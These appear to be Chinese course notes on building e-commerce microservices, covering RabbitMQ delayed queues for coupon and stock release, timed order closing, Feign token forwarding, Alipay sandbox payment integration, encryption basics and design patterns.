![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第二十八章 下单-优惠券记录锁定和释放功能设计开发

 

#### 第1集 商品下单锁定优惠券记录模块开发

**简介：商品下单锁定优惠券记录模块开发**

* 协议设计

```
    /**
     * 记录id
     */
    private List<Long> lockCouponRecordIds;

    /**
     * 订单号
     */
    private String orderOutTradeNo;
```



* controlle层接口开发
* service层开发

























#### 第2集 优惠券微服务RabbitMQ延迟消息交换机和队列配置

**简介：优惠券微服务RabbitMQ延迟消息交换机和队列配置**

![image-20210226173604400](img/image-20210226173604400.png)

* 配置文件

```
#自定义消息队列配置，发送锁定库存消息-》延迟exchange-》lock.queue-》死信exchange-》release.queue
mqconfig:
  #延迟队列，不能被监听消费
  coupon_release_delay_queue: coupon.release.delay.queue

  #延迟队列的消息过期后转发的队列
  coupon_release_queue: coupon.release.queue

  #交换机
  coupon_event_exchange: coupon.event.exchange

  #进入延迟队列的路由key
  coupon_release_delay_routing_key: coupon.release.delay.routing.key

  #消息过期，进入释放死信队列的key
  coupon_release_routing_key: coupon.release.routing.key

  #消息过期时间,毫秒,测试改为15秒
  ttl: 15000
```



* 配置类

```

    /**
     * 交换机
     */
    @Value("${mqconfig.coupon_event_exchange}")
    private String eventExchange;


    /**
     * 第一个队列延迟队列，
     */
    @Value("${mqconfig.coupon_release_delay_queue}")
    private String couponReleaseDelayQueue;

    /**
     * 第一个队列的路由key
     * 进入队列的路由key
     */
    @Value("${mqconfig.coupon_release_delay_routing_key}")
    private String couponReleaseDelayRoutingKey;


    /**
     * 第二个队列，被监听恢复库存的队列
     */
    @Value("${mqconfig.coupon_release_queue}")
    private String couponReleaseQueue;

    /**
     * 第二个队列的路由key
     *
     * 即进入死信队列的路由key
     */
    @Value("${mqconfig.coupon_release_routing_key}")
    private String couponReleaseRoutingKey;

    /**
     * 过期时间
     */
    @Value("${mqconfig.ttl}")
    private Integer ttl;
```













#### 第3集  延迟消息功能测试开发和注意事项

**简介：延迟消息测试和注意事项**

* 测试代码编写测试

```

@RunWith(SpringRunner.class)
@SpringBootTest(classes = CouponApplication.class)
@Slf4j
public class DemoApplicationTests {

    @Autowired
    private RabbitTemplate rabbitTemplate;

    @Test
    public void send(){
      rabbitTemplate.convertAndSend("coupon.event.exchange","coupon.release.delay.routing.key","5qeqweqw");
      
  }

}

```



* 注意
  * 有些版本会自动创建队列和交换机@bean，有些是要初次请求才会（如果有同学知道原因可以分享下）
  * 如果MQ已经存在对应的队列，则不会重新创建
  * 修改配置后，需要删除队列重新建立生效
  * 如果队列和交换机已经存在，重新启动项目会有错误警告，可以忽略



















#### 第4集 优惠券锁定-发送延迟消息功能开发

**简介：优惠券微服务发送延迟消息开发**

* 消息协议介绍

```
@Data
public class CouponRecordMessage {

    /**
     * 消息队列id
     */
    private Long messageId;

    /**
     * 订单号
     */
    private String outTradeNo;

    /**
     * 库存锁定工作单id
     */
    private Long taskId;

}
```



* 发送功能开发

```
for(CouponTaskDO couponTaskDO : couponTaskDOList){
  CouponRecordMessage couponRecordMessage = new CouponRecordMessage();
  couponRecordMessage.setOutTradeNo(orderOutTradeNo);
  couponRecordMessage.setTaskId(couponTaskDO.getId());

                  rabbitTemplate.convertAndSend(rabbitMQConfig.getEventExchange(),rabbitMQConfig.getCouponReleaseDelayRoutingKey(),couponRecordMessage);
  log.info("优惠券锁定消息发送成功:{}",couponRecordMessage.toString());
}
```





















#### 第5集 优惠券微服务延迟消息消费-释放优惠券功能开发《上》

**简介：优惠券回收-延迟消息消费回收功能开发《上》**

* 优惠券消费MQ监听器开发

* 流程梳理

```
优惠券解锁记录场景
  1、超时未支付，比如30分钟则订单失效关闭
  2、下单成功，创建订单业务失败，订单回滚
 
 
库存解锁防止继续支付：
1、30分支付超时则无法支付订单
 
2、订单31分延迟消息(比订单超时大几分钟)
            ->查询订单状态-向第三方支付查询订单状态，只有未支付状态，且本地订单状态是NEW，才修改本地订单状态为取消CANCEL，其他业务才可以解锁对应的库存库存
 
3、商品、优惠券库存32分延迟消息(比订单超时大几分钟)
  ->查询订单状态-订单不存在，解锁库存
  ->查询订单状态
    1)订单状态为取消CANCEL的情况，才可以解锁库存，确认消息接收；
    2)订单状态为未支付NEW的情况，则不解锁库存，不修改订单状态，重新投递消息或者拒收；
      （避免网络延迟到 导致订单关单消息，比库存解锁还慢,没更新订单状态）
    3)如果是订单已经支付则修改库存task工作单状态，确认消息接收；
 
注意：延迟队列一定要开启手动的ack机制，防止解锁失败，消息丢失，也要防止多次解锁
    解锁库存的时候：修改状态和修改对应库存task工作单状态应该是同个事务，防止其中一个失败

```





















#### 第6集 订单微服务-查询订单支付状态接口开发

**简介：订单微服务-查询订单支付状态接口开发**

* 查询订单支付状态接口开发（MQ里面没token，不需要登录）





























#### 第7集 数据一致性多场景用例测试-延迟消息消费释放优惠券功能开发《下》

**简介：优惠券回收-延迟消息消费回收功能开发《下》**

* 流程测试
  * 写单元测试，发送消息
    * 订单支付完成用例测试
    * 订单超时未支付用例测试
    * 订单异常不存在用例测试
  * 消息延迟，监听消息处理
  * 记录更新情况
  * bug修复：useState变量名称

* 数据准备

```
INSERT INTO `product_order` (`id`, `out_trade_no`, `state`, `create_time`, `total_amount`, `pay_amount`, `pay_type`, `nickname`, `head_img`, `user_id`, `del`, `update_time`, `order_type`, `receiver_address`)
VALUES
  (1, '123456abc', 'PAY', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL, NULL);



INSERT INTO `coupon_task` (`id`, `coupon_record_id`, `create_time`, `out_trade_no`, `lock_state`)
VALUES
  (1, 1, '2021-02-27 16:05:11', '123456abc', 'LOCK');

```

* 功能流程完善
  * 业务逻辑优化
  * 如何保证消息不会重复消费-幂等处理
  * 多个消息并发情况下是否需要加锁
  * 是否还有其他问题，大家可以思考下，然后给出解决方案












![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第二十九章 高并发下商品库存扣减和释放解决方案设计和编码





#### 第1集 商品下单-商品库存锁定模块设计和开发

**简介：商品下单-锁定商品库存模块开发**

* 协议设计

```
@Data
public class LockProductRequest {

    @JsonProperty("order_out_trade_no")
    private String orderOutTradeNo;

    @JsonProperty("order_item_list")
    private List<OrderItemRequest> orderItemList;

}

@Data
public class OrderItemRequest{

    @JsonProperty("product_id")
    private long productId;

    @JsonProperty("buy_num")
    private int buyNum;

}
```



* controlle层接口开发
* service层开发
* 登录拦截器配置















#### 第2集 商品微服务RabbitMQ延迟消息交换机和队列配置

**简介：商品微服务RabbitMQ延迟消息交换机和队列配置**

![image-20210228154058403](img/image-20210228154058403.png)

* 配置文件

```
#自定义消息队列配置，发送锁定库存消息-》延迟exchange-》lock.queue-》死信exchange-》release.queue
mqconfig:
  #延迟队列，不能被监听消费
  stock_release_delay_queue: stock.release.delay.queue

  #延迟队列的消息过期后转发的队列
  stock_release_queue: stock.release.queue

  #交换机
  stock_event_exchange: stock.event.exchange

  #进入延迟队列的路由key
  stock_release_delay_routing_key: stock.release.delay.routing.key

  #消息过期，进入释放队列的key
  stock_release_routing_key: stock.release.routing.key

  #消息过期时间,毫秒,测试改为15秒
  ttl: 15000
```



* 配置类

```
    /**
     * 交换机
     */
    @Value("${mqconfig.stock_event_exchange}")
    private String eventExchange;


    /**
     * 第一个队列延迟队列，
     */
    @Value("${mqconfig.stock_release_delay_queue}")
    private String stockReleaseDelayQueue;

    /**
     * 第一个队列的路由key
     * 进入队列的路由key
     */
    @Value("${mqconfig.stock_release_delay_routing_key}")
    private String stockReleaseDelayRoutingKey;


    /**
     * 第二个队列，被监听恢复库存的队列
     */
    @Value("${mqconfig.stock_release_queue}")
    private String stockReleaseQueue;

    /**
     * 第二个队列的路由key
     *
     * 即进入死信队列的路由key
     */
    @Value("${mqconfig.stock_release_routing_key}")
    private String stockReleaseRoutingKey;

    /**
     * 过期时间
     */
    @Value("${mqconfig.ttl}")
    private Integer ttl;
```









#### 第3集  商品锁定-延迟消息功能测试开发和注意事项

**简介：延迟消息测试和注意事项**

* 测试代码编写测试

```
@RunWith(SpringRunner.class)
@SpringBootTest(classes = ProductApplication.class)
@Slf4j
public class DemoApplicationTests {

    @Autowired
    private RabbitTemplate rabbitTemplate;

    @Test
    public void send(){
      rabbitTemplate.convertAndSend("stock.event.exchange","stock.release.delay.routing.key","23342342");
      
  }

}

```



* 注意
  * 只有微服务监听mq，才会创建对应的队列和交换机，所以编写测试方法或者写监听器就行
  * IOC容器存在不行，RabbitMQ默认是懒加载模式
  * 如果MQ已经存在对应的队列，则不会重新创建
  * 修改配置后，需要删除队列重新建立生效
  * 如果队列和交换机已经存在，重新启动项目会有错误警告，可以忽略









#### 第4集 商品库存锁定-发送延迟消息功能开发

**简介：商品微服务发送延迟消息开发**

* 消息协议介绍

```
@Data
public class ProductMessage {

    /**
     * 消息队列id
     */
    private Long messageId;


    /**
     * 订单号
     */
    private String outTradeNo;

    /**
     * 库存锁定工作单id
     */
    private Long taskId;

}

```



* 发送功能开发

```
//发送MQ延迟消息 ，解锁商品库存 taskId  TODO
ProductMessage productMessage = new ProductMessage();
productMessage.setTaskId(productTaskDO.getId());
productMessage.setOutTradeNo(orderOutTradeNo);
                rabbitTemplate.convertAndSend(rabbitConfig.getEventExchange(),rabbitConfig.getStockReleaseDelayRoutingKey(),productMessage);
log.info("商品库存锁定信息发送成功:{}",productMessage);
```

















#### 第5集 商品微服务延迟消息消费-释放商品库存功能开发《上》

**简介：商品库存释放回收功能开发《上》**

* 商品微服务消费MQ监听器开发

* 流程梳理

```
商品库存解锁记录场景
  1、超时未支付，比如30分钟则订单失效关闭
  2、下单成功，创建订单业务失败，订单回滚
 
 
库存解锁防止继续支付：
1、30分支付超时则无法支付订单
 
2、订单31分延迟消息(比订单超时大几分钟)
            ->查询订单状态-向第三方支付查询订单状态，只有未支付状态，且本地订单状态是NEW，才修改本地订单状态为取消CANCEL，其他业务才可以解锁对应的库存库存
 
3、商品、优惠券库存32分延迟消息(比订单超时大几分钟)
  ->查询订单状态-订单不存在，解锁库存
  ->查询订单状态
    1)订单状态为取消CANCEL的情况，才可以解锁库存，确认消息接收；
    2)订单状态为未支付NEW的情况，则不解锁库存，不修改订单状态，重新投递消息或者拒收；
      （避免网络延迟到 导致订单关单消息，比库存解锁还慢,没更新订单状态）
    3)如果是订单已经支付则修改库存task工作单状态，确认消息接收；
 
注意：延迟队列一定要开启手动的ack机制，防止解锁失败，消息丢失，也要防止多次解锁
    解锁库存的时候：修改状态和修改对应库存task工作单状态应该是同个事务，防止其中一个失败

```















#### 第6集 数据一致性多场景用例测试-延迟消息消费释放商品库存开发《下》

**简介: 商品库存回收-延迟消息消费回收功能开发《下》**

* 流程测试
  * 写单元测试，发送消息
    * 订单支付完成用例测试
    * 订单超时未支付用例测试
    * 订单异常不存在用例测试
  * 消息延迟，监听消息处理
  * 记录更新情况
  * 数据准备

```
INSERT INTO `product_order` (`id`, `out_trade_no`, `state`, `create_time`, `total_amount`, `pay_amount`, `pay_type`, `nickname`, `head_img`, `user_id`, `del`, `update_time`, `order_type`, `receiver_address`)
VALUES
  (1, '123456abc', 'PAY', NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, NULL, NULL, NULL);



INSERT INTO `product_task` (`id`, `product_id`, `buy_num`, `product_name`, `lock_state`, `out_trade_no`, `create_time`)
VALUES
  (1, 1, 2, '杯子-小滴课堂', 'LOCK', '123456abc', '2021-02-28 16:01:52');
```

* 功能流程完善
  * 业务逻辑优化
  * 如何保证消息不会重复消费-幂等处理
  * 多个消息并发情况下是否需要加锁
  * 是否还有其他问题，大家可以思考下，然后给出解决方案














![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第三十章 1024电商平台-订单微服务下单和验价设计和开发



#### 第1集 订单微服务下单逻辑之确认收货地址模开发

**简介: 订单微服务-确认收货地址模块开发**

* 订单号生产
* 获取收货地址详情
  * 方案一：前端一并传递收货地址详情过来
    * 少了一次网络交互
    * 前后端通信包更大
  * 方案二：后端根据收货地址id调用服务查询地址详情
    * 多了一次网络交换
    * 前后端通信包更小

* 功能测试
  * token传递失败















#### 第2集 Feign底层源码-token令牌丢失原因分析和解决方案

**简介: token令牌丢失原因分析和解决方案**

* token传递失败原因分析
* 解决方案-加入到common公共类上

```
@Bean("requestInterceptor")
    public RequestInterceptor requestInterceptor(){
        return template -> {
            ServletRequestAttributes attributes = (ServletRequestAttributes)RequestContextHolder.getRequestAttributes();
            if(attributes!=null){
                HttpServletRequest request = attributes.getRequest();
                if (null == request){
                    return;
                }
                log.info(request.getHeaderNames().toString());
                template.header("token", request.getHeader("token"));
            }else {
                log.warn("requestInterceptor获取Header空指针异常");
            }
        };
    }
```





















#### 第3集 订单微服务-下单获取商品最新价格开发

**简介:订单微服务下单获取最新价格开发**

* 获取最新商品价格开发

```
 /**
     * 用于订单服务，确认订单，获取全部购物项
     *
     * 会清空购物车对应的商品
     *
     * @return
     */
    @ApiOperation("下单清空购物项")
    @RequestMapping("confirm_order_cart_items")
    public  JsonData confirmOrderCartItem(@ApiParam("商品id列表") @RequestBody List<Long> productIdList ){
        List<CartItemVO> cartItemVOList = cartService.confirmOrderCartItem(productIdList);
        return JsonData.buildSuccess(cartItemVOList);
    }
    
```

* 下单协议

```
{
  "coupon_record_id":-1,
  "product_ids":[1,2],
  "pay_type":"ALIPAY",
  "client_type":"H5",
  "address_id":45,
  "total_amount":10,
  "real_pay_amount":10,
  "token":"SbD5D4FLpUzemiuwSEytwGM9LLFGISDQ"
}
```



















#### 第4集 多种解决方案设计-购物车清空下单商品的设计思路你知道多少

**简介:下单-购物车清空已经下单商品逻辑作业设计**

* 需求作业
  * 用户创建订单，购物车的商品什么时候进行清除
  * 假如下单流程异常后，怎么回滚

* 清空购物车逻辑设计方案一

  * 想加分布式事务Seata？？？？

  

* 【推荐】清空购物车逻辑设计方案二
  * 直接调用清空-MQ延迟消息（假如订单创建失败则购物车会丢失数据）
    * 解决方案：类似库存解锁和优惠券释放一样的思路（购物车这边做）
      * 延迟消息可以1分钟或者5分钟
      * 直接查询订单是否存在即可（协议增加一个outTradeNo）

* 这是一个作业，大家要自己尝试哈



















#### 第5集 订单微服务-商品验价和优惠券的抵扣功能开发《上》

**简介:商品验证价格和优惠券抵扣功能开发**

* 统计商品价格
* 远程调用获取优惠券

* 当前购物车是否满足优惠券使用条件
* 验证价格



















#### 第6集 订单微服务-下单锁定优惠券和商品库存逻辑开发《下》

**简介:下单锁定优惠券和商品库存逻辑开发**

* 锁定优惠券
* 锁定商品库存























#### 第7集 订单微服务-创建商品订单和订单项模块开发

**简介:下单创建商品订单和订单项模块开发**

* 下单创建商品订单
* 下单创建商品订单项

* bug
  * 数据库 product_order 表的 user_id 改为bigint类型，java类型是long




















![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第三十一章 订单超时未支付-定时关单功能设计和开发



#### 第1集 订单超时未支付-定时关单功能流程设计

**简介:订单超时未支付-定时关单功能设计**

* 业务流程梳理
  * 消息消费-关单流程设计

![image-20210228201822813](img/image-20210228201822813.png)













#### 第2集 定时关单RabbitMQ延迟消息交换机和队列配置

**简介：定时关单RabbitMQ延迟消息交换机和队列配置**

![image-20210302191035911](img/image-20210302191035911.png)

* 配置文件

```
#自定义消息队列配置，发送锁定库存消息-》延迟exchange-》lock.queue-》死信exchange-》release.queue
mqconfig:
  #延迟队列，不能被监听消费
  order_close_delay_queue: order.close.delay.queue

  #延迟队列的消息过期后转发的队列
  order_close_queue: order.close.queue

  #交换机
  order_event_exchange: order.event.exchange

  #进入延迟队列的路由key
  order_close_delay_routing_key: order.close.delay.routing.key

  #消息过期，进入释放队列的key,进入死信队列的key
  order_close_routing_key: order.close.routing.key

  #消息过期时间,毫秒,测试改为15秒
  ttl: 15000
```



* 配置类

```
    /**
     * 交换机
     */
    @Value("${mqconfig.order_event_exchange}")
    private String eventExchange;


    /**
     * 延迟队列
     */
    @Value("${mqconfig.order_close_delay_queue}")
    private String orderCloseDelayQueue;

    /**
     * 关单队列
     */
    @Value("${mqconfig.order_close_queue}")
    private String orderCloseQueue;



    /**
     * 进入延迟队列的路由key
     */
    @Value("${mqconfig.order_close_delay_routing_key}")
    private String orderCloseDelayRoutingKey;


    /**
     * 进入死信队列的路由key
     */
    @Value("${mqconfig.order_close_routing_key}")
    private String orderCloseRoutingKey;

    /**
     * 过期时间
     */
    @Value("${mqconfig.ttl}")
    private Integer ttl;
```



















#### 第3集  订单微服务下单-延迟消息功能测试开发和注意事项

**简介：延迟消息测试和注意事项**

* 测试代码编写测试

```
@RunWith(SpringRunner.class)
@SpringBootTest(classes = OrderApplication.class)
@Slf4j
public class DemoApplicationTests {

    @Autowired
    private RabbitTemplate rabbitTemplate;

    @Test
    public void send(){
      rabbitTemplate.convertAndSend("order.event.exchange","order.close.delay.routing.key","23342342");
      
  }

}

```



* 注意
  * IOC容器存在不行，RabbitMQ默认是懒加载模式
  * 只有微服务监听mq，才会创建对应的队列和交换机，所以编写测试方法或者写监听器就行
  * 如果MQ已经存在对应的队列，则不会重新创建
  * 修改配置后，需要删除队列重新建立生效
  * 如果队列和交换机已经存在，重新启动项目会有错误警告，可以忽略















#### 第4集 订单超时未支付定时关单-发送消息功能开发

**简介：用户下单发送定时关单消息开发**

* 消息协议介绍

```
@Data
public class OrderMessage {

    /**
     * 消息队列id
     */
    private Long messageId;


    /**
     * 订单号
     */
    private String outTradeNo;

}

```



* 发送功能开发

```
 //MQ发送延迟队列 TODO，用于自动关单
OrderMessage orderMessage = new OrderMessage();
orderMessage.setOutTradeNo(orderOutTradeNo);
rabbitTemplate.convertAndSend(rabbitConfig.getEventExchange(), rabbitConfig.getOrderCloseDelayRoutingKey(), orderMessage);
```

















#### 第5集 订单微服务-订单超时未支付自动关单-消息监听处理

**简介：订单微服务-订单超时未支付关单消息监听处理**

* 订单微服务消费MQ监听器开发

* 流程梳理

![image-20210302225558431](img/image-20210302225558431.png)










![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第三十二章 第三方支付平台对接-蚂蚁金服开放平台接入



#### 第1集 常用的第三方支付和聚合支付平台介绍

**简介：介绍常用的第三方支付和聚合支付**

* 什么是第三方支付

  * 第三方支付是指具备一定实力和信誉保障的独立机构，采用与各大银行签约的方式，通过与银行支付结算系统接口对接而促成交易双方进行交易的网络支付模式
  * 通俗的例子：  
    * 支付宝，微信支付，百度钱包，PayPal（主要是欧美国家）
    * 拉卡拉(中国最大线下便民金融服务提供商)
  * 优点
    * 支付平台降低了政府、企业、事业单位直连银行的成本，满足了企业专注发展在线业务的收付要求。
    * 使用方便。对支付者而言，他所面对的是友好的界面，不必考虑背后复杂的技术操作过程

  * 缺点
    * 风险问题，在电子支付流程中，资金都会在第三方支付服务商处滞留即出现所谓的资金沉淀，如缺乏有效的流动性管理，则可能存在资金安全和支付的风险
    * 电子支付经营资格的认知、保护和发展问题

* 什么是聚合支付也叫第四方支付
  * 聚合支付是相对之前的第三方支付而言的，作为对第三方支付平台服务的拓展，第三方支付是介于银行和商户之间的，而聚合支付是介于第三方支付和商户之间
  * 出现的场景
    * 一堆第三方支付出现，并通过大量的钱补贴线上商家使用它们的支付，导致商户收银台堆满各种，POS机器，扫码设备，商户还需要去各家支付公司申请账号，结算等
    * 聚合支付产品，其实聚合的是一种支付能力（支付宝支付、微信支付、百度钱包、ApplePay……），将这些收款能力聚合在一起，统一打包提供给电商网站或一些线下商家
  * 解决的问题
    * 聚合支付公司提供的二维码，支付多种方式支付，不再是一种，各个公司的竞争，就是支付渠道和方式的支持

















#### 第2集 蚂蚁金服开放平台介绍和支付宝支付应用申请

**简介：蚂蚁金服开放平台介绍和支付宝申请**

* 蚂蚁金服开放平台
  * 地址：https://openhome.alipay.com/docCenter/docCenter.htm
  * 介绍：https://opendocs.alipay.com/open/200/105304
  * 支付宝扫码登录即可

* 网页移动应用开发指南
  * 地址：https://opendocs.alipay.com/open/200
  * 申请应用：https://openhome.alipay.com/platform/developerIndex.htm
  * 核心是获取APPID

![image-20210303171446750](img/image-20210303171446750.png)

















#### 第3集 支付宝沙箱环境介绍和应用权限申请

**简介：支付宝沙箱环境介绍和应用权限申请**

* 支付宝沙箱环境介绍

```
蚂蚁沙箱环境 (Beta) 是协助开发者进行接口功能开发及主要功能联调的辅助环境

 在开发者应用上线审核前，开发者可以根据自身需求，先在沙箱环境中了解、组合和调试各种开放接口，进行开发调试工作，从而帮助开发者在应用上线审核完成后，能更快速、更顺利的完成线上调试和验收
```

* 文档地址：https://opendocs.alipay.com/open/200/105311
* 沙箱地址：https://openhome.alipay.com/platform/appDaily.htm?tab=info

*  支付接入：有时不稳定，或者一直报错等等，一般就是支付宝沙箱环境问题

```
Beta 测试阶段每周日中午 12 点至每周一中午 12 点为维护时间，在此时间内沙箱环境部分功能可能不可用，敬请谅解。
```

* APPID: 2016092000555936
* 沙箱支付宝网关：https://openapi.alipaydev.com/gateway.do

* 买家信息

```
买家账号mqvsso5323@sandbox.com
登录密码111111
支付密码111111
用户名称沙箱环境
证件类型身份证(IDENTITY_CARD)
证件号码285405199408130839
```

* 商家信息

```
商家账号bqnism8671@sandbox.com
商户UID2088102176491744
登录密码111111
```









#### 第4集 密码学的那些事情-非对称加密和对称加密介绍

**简介：介绍密码学-对称加密和非对称加密**

* 对称加密

![image-20210304124627762](img/image-20210304124627762.png)

```
优点：操作比较简单,加密速度快,秘钥简单    
缺点：秘钥上面，一旦被窃取，信息会暴露，安全性不高 
场景：消息发送方需要加密大量数据时使用   
常见的算法：    
DES： 全称：Data Encryption Standard，现已被破解    

3DES：全称: Triple Data Encryption Algorithm, 暂时未被破解     
解释:  3DES 是在 DES 基础算法上的改良，该算法可向下兼容 DES 加密算法，但计算性能不高，暂时还未被破解 
  
AES:  全称：Advanced Encryption Standard，暂未被破解
```



* 非对称加密

![image-20210304124609278](img/image-20210304124609278.png)

```
注意：非对称加密具有双向性，即公钥和私钥中的任一个均可用作加密，此时另一个则用作解密

解释:加密与解密的过程不是对称的，不是用的同一个秘钥，一把是公钥，一把是私钥，在加密的时候，用公钥去加密，接收方再用对应的私钥去解密  

优点：安全性更高，公钥是公开的，秘钥是自己保存的，不需要将私钥给别人。 

缺点：加密和解密花费时间长、速度慢，只适合对少量数据进行加密
  
场景: 数字签名与验证 

常见的算法：RSA，DSA，ECC等，ECC也是比特币底层用的比较多的算法

```

















#### 第5集 应用对接支付宝里面的非对称加密流程梳理

**简介：支付宝开里面的非对称加密通讯流程梳理**

* 应用对接支付宝加密流程

![image-20210304130526547](img/image-20210304130526547.png)



* 手机网站支付文档地址:
  *  https://opendocs.alipay.com/apis/api_1/alipay.trade.wap.pay?scene=API002020081300013628
  * 参数介绍
  * 流程介绍

* 项目依赖包添加和样例代码

  * https://opendocs.alipay.com/open/54/cyz7do

  * ```
    <!-- https://mvnrepository.com/artifact/com.alipay.sdk/alipay-sdk-java -->
    <dependency>
        <groupId>com.alipay.sdk</groupId>
        <artifactId>alipay-sdk-java</artifactId>
        <version>4.10.218.ALL</version>
    </dependency>
    
    ```

    















#### 第6集 支付宝开发助手简介和非对称加密钥生成工具下载

**简介：支付宝开发助手简介和秘钥生成工具下载**

* 支付宝开发助手简介

  * 支付宝开放平台开发助手即密钥生成工具，用于对应用的客户端服务端之间的交互进行加密保护。
  * 工具主要功能有生成密钥、签名、验签、格式转换、密钥匹配、智能反馈、开放社区
  * https://opendocs.alipay.com/open/291/introduce

  ![image-20210304131616125](img/image-20210304131616125.png)

  ![image-20210304131533225](img/image-20210304131533225.png)

* 秘钥生成工具下载

* 代码新建配置类













#### 第7集 手机网站支付宝支付样例代码+单例设计模式应用

**简介：手机网站支付宝支付样例代码编写测试**

* 编写样例代码
* 测试参数配置使用

```
      //商户订单号,64个字符以内、可包含字母、数字、下划线；需保证在商户端不重复
        String no = UUID.randomUUID().toString();
        log.info("订单号:{}",no);
        content.put("out_trade_no", no);
        content.put("product_code", "FAST_INSTANT_TRADE_PAY");
        //订单总金额，单位为元，精确到小数点后两位
        content.put("total_amount", String.valueOf("111.99"));
        //商品标题/交易标题/订单标题/订单关键字等。 注意：不可使用特殊字符，如 /，=，&amp; 等。
        content.put("subject", "杯子");
        //商品描述，可空
        content.put("body", "好的杯子");
        // 该笔订单允许的最晚付款时间，逾期将关闭交易。取值范围：1m～15d。m-分钟，h-小时，d-天，1c-当天（1c-当天的情况下，无论交易何时创建，都在0点关闭）。 该参数数值不接受小数点， 如 1.5h，可转换为 90m。
        content.put("timeout_express", "5m");

```













#### 第8集 沙箱环境常见的坑和手机网站支付宝支付样例问题修复

**简介：手机网站支付宝支付样例代码问题修改**

* Bug修改

* 沙箱环境的坑

  * 如果支付页面出现 "支付存在钓鱼风险" ，清空浏览器缓存，只开一个支付宝支付窗口

  * 每周日中午12点至每周一中午12点沙箱环境进行维护，期间可能出现不可用

    














![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第三十三章 设计模式在多渠道支付里面的设计+编码实战





#### 第1集 软件架构设计-设计模式的六大原则你知道多少

**简介：讲解设计模式的六大设计原则**

- 设计模式是站在设计原则的基础之上的，软件架构也一样，有必要对这些设计原则先做一下了解

- 软件设计开发原则

  - 为了让的代码更好重用性，可读性，可靠性，可维护性
  - 诞生出了很多软件设计的原则，这6大设计原则是我们要掌握的
  - 将六大原则的英文首字母拼在一起就是SOLID（稳定的），所以也称之为SOLID原则

  ![img](https://file.xdclass.net/note/2020/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/img/3333.jpg)

- 单一职责原则

  - 一个类只负责一个功能领域中的相应职责，就一个类而言，应该只有一个引起它变化的原因
  - 是实现**高内聚、低耦合**的指导方针
  - 解释：
    - 高内聚
      - 尽可能类的每个成员方法只完成一件事（最大限度的聚合）
      - 模块内部的代码， 相互之间的联系越强，内聚就越高， 模块的独立性就越好
    - 低耦合: 减少类内部，一个成员方法调用另一个成员方法, 不要有牵一发动全身

   

- 开闭原则

  - 对扩展开放，对修改关闭，在程序需要进行拓展的时候，不能去修改原有的代码，实现一个热插拔的效果

   

- 里氏替换原则LSP

  - 任何基类可以出现的地方，子类一定可以出现
  - 在程序中尽量使用基类类型来对对象进行定义，而在运行时再确定其子类类型，用子类对象来替换父类对象
  - controller->service->dao

   

- 依赖倒转原则

  - 是开闭原则的基础，针对接口编程，依赖于抽象而不依赖于具体
  - 高层模块不应该依赖低层模块，二者都应该依赖其抽象

   

- 接口隔离原则

  - 客户端不应该依赖那些它不需要的接口
  - 使用多个隔离的接口，比使用单个接口要好，降低类之间的耦合度

   

- 迪米特法则

  - 最少知道原则，一个实体应当尽量少地与其他实体之间发生相互作用，使得系统功能模块相对独立
  - 类之间的耦合度越低，就越有利于复用，一个处在松耦合中的类一旦被修改，不会对关联的类造成太大波及
  - 通过引入一个合理的第三者来降低现有对象之间的耦合度























#### 第2集 设计模式最佳实践-第三方支付对接-工厂模式回顾

**简介：设计模式知识回顾-工厂模式**

* 工厂模式介绍：

  - 它提供了一种创建对象的最佳方式，我们在创建对象时不会对客户端暴露创建逻辑，并且是通过使用一个共同的接口来指向新创建的对象

* 工厂模式有 3 种不同的实现方式

  - 简单工厂模式：通过传入相关的类型来返回相应的类,这种方式比较单 一 , 可扩展性相对较差;
  - 工厂方法模式：通过实现类实现相应的方法来决定相应的返回结果,这种方式的可扩展性比较强；
  - 抽象工厂模式：基于上述两种模式的拓展，且支持细化产品

  

- 例子：

  - 需要购买一辆车，不用管车辆如何组装，且可以购买不同类型的比如轿车、SUV、跑车，直接去4s店购买就行（4s店就是工厂）
  - 工厂生产电脑，除了A品牌、还可以生产B、C、D品牌电脑
  - 业务开发中，支付很常见，里面有统一下单和支付接口，具体的支付实现可以微信、支付宝、银行卡等

  ![image-20200926114649412](https://file.xdclass.net/note/2020/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/img/image-20200926114649412.png)



- 简单工厂模式

  - 又称静态工厂方法, 可以根据参数的不同返回不同类的实例，专门定义一个类来负责创建其他类的实例，被创建的实例通常都具有共同的父类
  - 由于工厂方法是静态方法，可通过类名直接调用，而且只需要传入简单的参数即可

  

- 优点：

  - 将对象的创建和对象本身业务处理分离可以降低系统的耦合度，使得两者修改起来都相对容易。

- 缺点

  - 工厂类的职责相对过重，增加新的产品需要修改工厂类的判断逻辑，这一点与开闭原则是相违背
  - 即开闭原则（Open Close Principle）对扩展开放，对修改关闭，程序需要进行拓展的时候，不能去修改原有的代码，实现一个热插拔的效果
  - 将会增加系统中类的个数，在一定程度上增加了系统的复杂度和理解难度，不利于系统的扩展和维护，创建简单对象就不用模式

* 项目里面的应用

![image-20210304195923127](img/image-20210304195923127.png)





















#### 第3集 设计模式最佳实践-第三方支付对接-策略模式回顾

**简介：设计模式知识回顾-策略模式**

- 策略模式(Strategy Pattern)
  - 定义一系列的算法,把它们一个个封装起来, 并且使它们可相互替换
  - 淘宝天猫双十一，正在搞活动有打折的、有满减的、有返利的等等，这些算法只是一种策略，并且是随时都可能互相替换的, 我们就可以定义一组算法，将每个算法都封装起来，并且使它们之间可以互换

 

- 应用场景
  - 老王计划外出旅游，选择骑自行车、坐汽车、飞机等，每一种旅行方式都是一个策略
